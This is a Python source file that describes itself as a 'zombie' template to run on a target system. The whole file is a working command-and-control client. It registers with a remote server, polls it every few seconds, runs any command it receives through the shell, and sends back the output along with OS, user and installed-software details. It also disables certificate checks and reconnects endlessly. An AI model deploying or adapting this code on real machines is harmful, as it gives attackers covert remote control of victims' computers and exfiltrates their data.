#!/usr/bin/env python3

'''
This is a template which runs on target system and works as a zombie
'''

import requests
from time import sleep
import argparse
import platform
# disable insecure request warning
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Zombie:
    def __init__(self, server_ip, server_port, server_protocol):
        self.server_ip = server_ip
        self.server_port = server_port
        self.server_protocol = server_protocol
        self.connection_is_closed = None

    def connect_to_server(self):
        self.client_id = None
        self.client_token = None

        self.remote_url = f'{self.server_protocol}://{self.server_ip}:{self.server_port}/'

        os_info = platform.platform()
        try:
            req_new_client = requests.get(self.remote_url, params={'req_type':'new', 'client_os':os_info}, verify=False)
        except :
            return

        self.client_id = req_new_client.json()['client_id']
        self.client_token = req_new_client.json()['token']

        self.send_get_signal()

    def send_get_signal(self):
        while True:
            sleep(3)
            try:
                req_get_signal = requests.get(self.remote_url, params=
                {
                'req_type' : 'get-signal',
                    'client_id' : self.client_id,
                    'token' : self.client_token
                }, verify=False
                                              )
            except:
                return

            try:
                resp_type = req_get_signal.json()['resp_type']
            except KeyError:
                return

            if resp_type == 'no_cmd':
                continue

            elif resp_type == 'reset':
                return

            elif resp_type == 'bad_token':
                return

            elif resp_type == 'run_cmd':
                cmd = req_get_signal.json()['cmd']
                cmd_id = req_get_signal.json()['cmd_id']
                self.execute_command(cmd=cmd ,cmd_id=cmd_id)

            elif resp_type == 'special_cmd':
                s_cmd = req_get_signal.json()['s_cmd']
                cmd_id = req_get_signal.json()['cmd_id']
                self.interpret_special_cmd(s_cmd=s_cmd, cmd_id=cmd_id)

    def send_post_output(self, cmd_id, output):
        request_params = {
            'resp_type' : 'send_output',
            'client_id' : self.client_id,
            'token' : self.client_token,
            'cmd_id' : cmd_id,
            'output' : output
        }
        try:
            req_output_post = requests.post(self.remote_url, data=request_params, verify=False)
        except:
            return

    def interpret_special_cmd(self, s_cmd, cmd_id):

        if s_cmd == 'get_os':
            self.send_os_info(cmd_id)

        elif s_cmd == 'get_software':
            self.send_software(cmd_id)

        elif s_cmd == 'whoami':
            self.send_whoami(cmd_id)


    def powershellize_command(self, command):
        powershell_command = 'powershell "{}"'.format(command)
        return powershell_command

    def get_os(self):
        import platform
        os_name = platform.system()
        return os_name.lower()

    def send_whoami(self, cmd_id):
        command = 'whoami'
        import os
        output = os.popen(command).read()

        self.send_post_output(cmd_id=cmd_id ,output=output)


    def send_software(self, cmd_id):
        os_name = self.get_os()
        import os
        if 'linux' in os_name:
            command = 'ls /usr/bin /opt'
            output = os.popen(command).read()

        elif 'windows' in os_name:
            command = 'Get-WmiObject -Class Win32_Product | Select-Object -Property Name'
            powershellized_command = self.powershellize_command(command=command)
            output = os.popen(powershellized_command).read()
        else:
            output = 'Other OS : {}'.format(os_name)

        self.send_post_output(cmd_id=cmd_id, output=output)

    def send_os_info(self, cmd_id):
        import platform
        os_info = platform.platform()

        self.send_post_output(cmd_id=cmd_id, output=os_info)

    def execute_command(self, cmd, cmd_id):

        import os
        output = os.popen(cmd).read()

        self.send_post_output(cmd_id=cmd_id, output=output)


def parse_args():
    server_ip = 'replace_server_ip'
    server_port = 'replace_server_port'
    server_protocol = 'replace_server_protocol'

    parser = argparse.ArgumentParser()

    parser.add_argument('--ip', help=f'Server Remote IP [Default : {server_ip}]', default="127.0.0.1")
    parser.add_argument('--port', help=f'Server Remote Port [Default : {server_port}]', default="443")
    parser.add_argument('--protocol', help=f'Server Protocol [http or https] [Default : '
                                           f'{server_protocol}]', default="https")

    args ,unknown = parser.parse_known_args()

    start_zombie(ip=args.ip, port=args.port, protocol=args.protocol)


def start_zombie(ip, port, protocol):
    server_ip = ip
    server_port = port
    server_port = int(server_port)
    while True:
        try:
            zombie = Zombie(server_ip=server_ip, server_port=server_port, server_protocol=protocol)
            zombie.connect_to_server()
            sleep(3)
        except KeyboardInterrupt:
            exit()

def start():
    parse_args()

if __name__ == '__main__':
    start()